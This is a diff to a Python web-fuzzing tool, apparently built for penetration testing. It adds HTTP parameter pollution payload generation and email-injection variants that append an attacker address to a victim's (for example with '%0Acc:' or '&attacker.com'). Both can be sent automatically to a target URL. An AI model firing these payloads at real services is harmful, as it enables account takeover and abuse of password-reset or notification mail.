@@ -3,13 +3,14 @@
 
 import warnings
 from bs4 import BeautifulSoup
-from urllib.parse import urlparse, parse_qs, quote, urlencode
-from collections import Counter
+from urllib.parse import urlparse, parse_qs, quote, urlencode, unquote
+from collections import Counter, defaultdict
 import sys
 import re
 import asyncio
 import copy
 import time
+import json
 
 
 warnings.filterwarnings("ignore")    # ignor any warning in teminal
@@ -58,12 +59,25 @@ EmailPays = ["@", "|", "||","|||", "%0Acc:", "&", "%", "#", "%", "%0Abcc:", "%5C
 HPP = ["&", ";", ":", "[]", "{}", "|", "||", "#", "@"]
 
 class Main:
-    def __init__(self, text=None, AD=None, A=None, V=None, VT=None):        
+    def __init__(self, text=None, AD=None, A=None, Data=None, Method=None,
+                 V=None, VT=None, Name=None, PAY=None, Print=None, 
+                 Headers=None, Cookies=None, Worker=None, Url=None, Proxy=None):        
         self.text = text
         self.AD = AD
         self.A = A
         self.V = V
         self.VT = VT
+        self.Name = Name
+        self.PAY = PAY
+        self.Data = Data
+        self.Print = Print
+        self.Method = Method
+        self.Headers = Headers
+        self.Cookies = Cookies
+        self.Worker = Worker
+        self.Url = Url
+        self.Proxy = Proxy
+
     
     async def Payed(self, type=None):
         Payed = []
@@ -116,8 +130,10 @@ class Main:
         elif type == "hpp":
             for h in HPP:     
                 Payed.append(h)
-        elif type == "dff": #To fuzz 2 Bytes
-            print("SOON")
+        elif type == "e": 
+            for e in EmailPays:
+                Payed.append(e)
+            #Todo: To fuzz 2 Bytes
         
         return list(set(Payed))
 
@@ -156,12 +172,12 @@ class Main:
         return abnormalizer.main(text=text)
     
 
-    async def Email_Pay(self, A, V, AD, Type=None):
+    async def Email_Pay(self, A=None, V=None, AD=None, Type=None):
         Genarated = []
         Pay_char = await self.Payed(type=self.VT)
         for xx in sorted(set(Pay_char)):
             #victim@mail.com@attackr@mail.com
-            Genarated.append(f"{A}{xx}{V}")
+            Genarated.append(f"{V}{xx}{A}")
             #name@Victim.com&attacker.com
             Genarated.append(f"{V}{xx}{AD}")
             #Array of emails
@@ -169,16 +185,142 @@ class Main:
         return Genarated 
     
     async def HPP(self, Type=None):
-        print("HPP")
+        Payed = []
+        char = await self.Payed(type=self.VT)
+        if Type == "Json":
+            query_params = json.loads(self.Data)
+            value = query_params.get(self.Name, [None])  
+            """
+            double the key: {'peram': 'value1', 'peram': 'value2'}
+            as any duplicate key will overwrite the previous value. take This as for facility in someCases
+            """
+            
+            #{'perma': ['value1', 'value2']}
+            double_Value = defaultdict(list)
+            double_Value[self.Name].append(value)
+            double_Value[self.Name].append(self.PAY)
+            Copy_QueryX = copy.deepcopy(query_params)
+            del Copy_QueryX[self.Name]
+            double_Value.update(query_params)
+            Valued = dict(double_Value)
+            Payed.append(json.dumps(Valued, indent=4))
+
+            #{'peram': ['value1[Char]', 'value2']}
+            for x in list(set(char)):
+                Copy_Query = copy.deepcopy(query_params)
+                dv2 = defaultdict(list)
+                dv2[self.Name].append(f"{value}{x}")
+                dv2[self.Name].append(self.PAY)
+                del Copy_Query[self.Name]
+                dv2.update(Copy_Query)
+                Valued = dict(dv2)
+                Payed.append(json.dumps(Valued, indent=4))
+                
+            #{'peram': ['value1', 'value2[Char]']}
+            for x1 in list(set(char)):
+                Copy_Query = copy.deepcopy(query_params)
+                dv2 = defaultdict(list)
+                dv2[self.Name].append(f"{value}")
+                dv2[self.Name].append(f"{x1}{self.PAY}")
+                del Copy_Query[self.Name]
+                dv2.update(Copy_Query)
+                Valued = dict(dv2)
+                Payed.append(json.dumps(Valued, indent=4))
+            #{'peram': ['value1[Char]', 'value2[Char]']}
+            for x2 in list(set(char)):
+                Copy_Query = copy.deepcopy(query_params)
+                dv2 = defaultdict(list)
+                dv2[self.Name].append(f"{value}{x2}")
+                dv2[self.Name].append(f"{x2}{self.PAY}")
+                del Copy_Query[self.Name]
+                dv2.update(Copy_Query)
+                Valued = dict(dv2)
+                Payed.append(json.dumps(Valued, indent=4))
+            #{'peram': ['[Char]value1', '[Char]value2']}
+            for x3 in list(set(char)):
+                Copy_Query = copy.deepcopy(query_params)
+                dv2 = defaultdict(list)
+                dv2[self.Name].append(f"{x3}{value}")
+                dv2[self.Name].append(f"{x3}{self.PAY}")
+                del Copy_Query[self.Name]
+                dv2.update(Copy_Query)
+                Valued = dict(dv2)
+                Payed.append(json.dumps(Valued, indent=4))
+            #{'peram': 'Value', '[Char]peram': 'Value'}
+            for x4 in list(set(char)):
+                Copy_Query = copy.deepcopy(query_params)
+                Copy_Query[f"{x4}{self.Name}"] = self.PAY
+                Payed.append(json.dumps(Copy_Query, indent=4))
+            #{'peram': 'Value', 'peram[Char]': 'Value'}
+            for x5 in list(set(char)):
+                Copy_Query = copy.deepcopy(query_params)
+                Copy_Query[f"{self.Name}{x5}"] = self.PAY
+                Payed.append(json.dumps(Copy_Query, indent=4))
+
+        else:
+            query_params = copy.deepcopy(parse_qs(self.Data))
+            value = query_params.get(self.Name, [None])
+
+
+            #name=value[with VT Vector]name=attacker;s
+            for xx in char:
+                query_params[self.Name] = f"{value}{xx}{self.Name}={self.PAY}"
+                new_query_string = urlencode(query_params, doseq=True)
+                Payed.append(unquote(new_query_string)) 
+
+        return Payed       
+
+
+   
 
     async def run(self, Type=None):
+        from utils import requester
         if Type == "email":
-            result = await self.Email_Pay(A=self.A, V=self.V, AD=self.AD)
-            if result:
-                for x in result:
-                    print(x)
+            emailVector = await self.Email_Pay(A=self.A, V=self.V, AD=self.AD)
+            if self.Data:
+                Payed = []
+                try:
+                    bodydict = json.loads(self.Data)
+                    for x in emailVector:
+                        bodydict[self.Name] = x    
+                        Payed.append(json.dumps(bodydict, indent=4))
+
+                    if self.Print:
+                        for x in Payed:
+                            print(x)
+                    else:
+                        semaphore = asyncio.Semaphore(1)  
+                        tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=d,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(Payed))]
+                        for task in asyncio.as_completed(tasks):
+                            await task
+                    
+                except json.JSONDecodeError:
+                    for x in emailVector:
+                        bodydict = parse_qs(self.Data)
+                        bodydict[self.Name] = x   
+                        new_query_string = urlencode(bodydict, doseq=True)
+                        print(new_query_string)
+            
         elif Type == "rff":
             result = await self.regexfuzzing(text=self.text, VT=self.VT)
             if result:
                 for x in result:
                     print(x)
+        elif Type == "hpp":
+            if self.Data:
+                try:
+                    bodydict = json.loads(self.Data)
+                    Payed = await self.HPP(Type="Json")  
+                    if self.Print:
+                        for x in Payed:
+                            print(x) 
+                    else:
+                        semaphore = asyncio.Semaphore(1)  
+                        tasks = [asyncio.create_task(requester.Main(Url=self.Url, Method=self.Method, Data=d,Semaphore=semaphore, Proxy=self.Proxy, Headers=self.Headers)) for d in list(set(Payed))]
+                        for task in asyncio.as_completed(tasks):
+                            await task
+
+                except json.JSONDecodeError:
+                    result = await self.HPP()
+                    for x in result:
+                        print(x)
